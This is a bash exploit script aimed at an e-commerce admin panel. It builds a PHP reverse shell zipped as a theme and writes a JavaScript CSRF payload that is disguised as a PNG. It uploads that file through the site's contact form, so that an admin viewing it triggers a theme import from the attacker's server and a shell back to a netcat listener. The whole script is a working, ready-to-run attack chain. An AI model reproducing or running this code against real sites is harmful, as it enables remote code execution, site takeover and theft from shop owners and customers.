#!/bin/bash

# Usage: ./exploit.sh <target_url> <admin_endpoint> <admin_email> <attacker_ip>

target_url="$1"
admin_endpoint="$2"
admin_email="$3"
attacker_ip="$4"

if [[ -z "$target_url" || -z "$admin_endpoint" || -z "$admin_email" || -z "$attacker_ip" ]]; then
    echo "Usage: $0 <target_url> <admin_endpoint> <admin_email> <attacker_ip>"
    exit 1
fi

# Netcat prompt
echo "[*] Ensure Netcat is listening: nc -nvlp 9001"
while ! pgrep -x "nc" > /dev/null; do
    sleep 1
    echo "[*] Awaiting netcat listener..."
done

# PHP reverse shell creation and ZIP packaging
echo "[*] Creating PHP reverse shell..."
curl -s "https://www.revshells.com/PHP%20PentestMonkey?ip=$attacker_ip&port=9001&shell=%2Fbin%2Fbash&encoding=%2Fbin%2Fbash" -o love.php
if [[ ! -f "love.php" ]]; then
    echo "[-] Failed to create PHP reverse shell."
    exit 1
fi

echo "[*] Packaging shell as Love-exploit.zip..."
zip -rq Love-exploit.zip love.php
if [[ ! -f "Love-exploit.zip" ]]; then
    echo "[-] Failed to create ZIP package."
    exit 1
fi

# Function to fetch CSRF token dynamically
fetch_csrf_token() {
    echo "[*] Fetching CSRF token..."
    csrf_token=$(curl -s "$target_url/contact-us" | grep -oP 'name="token" value="\K[^"]+')
    if [[ -z "$csrf_token" ]]; then
        echo "[-] Failed to retrieve CSRF token."
        exit 1
    fi
    echo "[+] CSRF token retrieved: $csrf_token"
}

# Build HTML payload for CSRF
echo "[*] Building HTML payload for CSRF..."
cat <<EOF > csrf_payload.html
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Exploit</title></head>
<body><script>
const baseUrl = '$target_url';
const path = '$admin_endpoint';
const httpServerIp = '$attacker_ip';
const httpServerPort = 8000;
const fileNameOfTheme = "Love-exploit.zip";

async function retrieveTokens() {
    const url = \`\${baseUrl}/\${path}/index.php/improve/design/themes/import\`;
    try {
        const res = await fetch(url, { method: 'GET', credentials: 'include' });
        const html = await res.text();
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, "text/html");
        const tokenAnchor = doc.querySelector('a.btn.btn-lg.btn-outline-danger.mr-3');
        const href = tokenAnchor ? tokenAnchor.getAttribute('href') : null;
        const tokenMatch = href ? href.match(/_token=([^&]+)/) : null;
        return tokenMatch ? tokenMatch[1] : null;
    } catch (error) {
        console.error('Token fetch error:', error);
    }
}

async function csrfToken(token) {
    const csrfUrl = \`\${baseUrl}/\${path}/index.php/improve/design/themes/import?_token=\${token}\`;
    try {
        const res = await fetch(csrfUrl, { method: 'GET', credentials: 'include' });
        const html = await res.text();
        const parser = new DOMParser();
        const csrfTokenInput = parser.parseFromString(html, "text/html").querySelector('input[name="import_theme[_token]"]');
        return csrfTokenInput ? csrfTokenInput.value : null;
    } catch (error) {
        console.error('CSRF token fetch error:', error);
    }
}

async function importTheme() {
    const locationHeaderToken = await retrieveTokens();
    const csrfToken = await csrfToken(locationHeaderToken);
    const formData = new FormData();
    formData.append('import_theme[import_from_web]', \`http://\${httpServerIp}:\${httpServerPort}/\${fileNameOfTheme}\`);
    formData.append('import_theme[_token]', csrfToken);
    const postUrl = \`\${baseUrl}/\${path}/index.php/improve/design/themes/import?_token=\${locationHeaderToken}\`;
    await fetch(postUrl, { method: 'POST', body: formData });
}
document.addEventListener('DOMContentLoaded', importTheme);
</script></body></html>
EOF

if [[ ! -f "csrf_payload.html" ]]; then
    echo "[-] Failed to create CSRF payload HTML file."
    exit 1
fi

# Convert HTML to PNG
echo "[*] Converting HTML to PNG..."
mv csrf_payload.html csrf_payload.png
if [[ ! -f "csrf_payload.png" ]]; then
    echo "[-] Failed to convert HTML payload to PNG."
    exit 1
fi

# Check and kill any existing process using port 8000
echo "[*] Checking for existing HTTP server on port 8000..."
existing_pid=$(lsof -ti :8000)
if [[ -n "$existing_pid" ]]; then
    echo "[*] Found existing server on port 8000 (PID: $existing_pid), terminating..."
    kill -9 "$existing_pid"
    if ps -p "$existing_pid" > /dev/null; then
        echo "[-] Failed to terminate existing HTTP server on port 8000."
        exit 1
    fi
    sleep 1
fi

# Start HTTP server for reverse shell delivery
echo "[*] Starting new HTTP server on port 8000 for payload delivery..."
python3 -m http.server 8000 &
sleep 2
if ! lsof -i :8000 | grep -q "LISTEN"; then
    echo "[-] HTTP server failed to start on port 8000."
    exit 1
fi

# Wait for 5 seconds to ensure the server is up
sleep 5

# Fetch CSRF token
fetch_csrf_token

# Upload payload
echo "[*] Uploading XSS payload to trigger CSRF..."
curl -i -s -k -X POST \
    -H "Content-Type: multipart/form-data" \
    -F "id_contact=2" \
    -F "from=$admin_email" \
    -F "fileUpload=@csrf_payload.png;type=image/png" \
    -F "message=PWNED!" \
    -F "submitMessage=Send" \
    -F "token=$csrf_token" \
    "$target_url/contact-us" > /dev/null 2>&1

if [[ $? -ne 0 ]]; then
    echo "[-] Failed to upload the CSRF payload."
    exit 1
fi

# Keep the script running to monitor HTTP server logs
echo "[*] Keeping script running to monitor for incoming connections..."
tail -f /dev/null
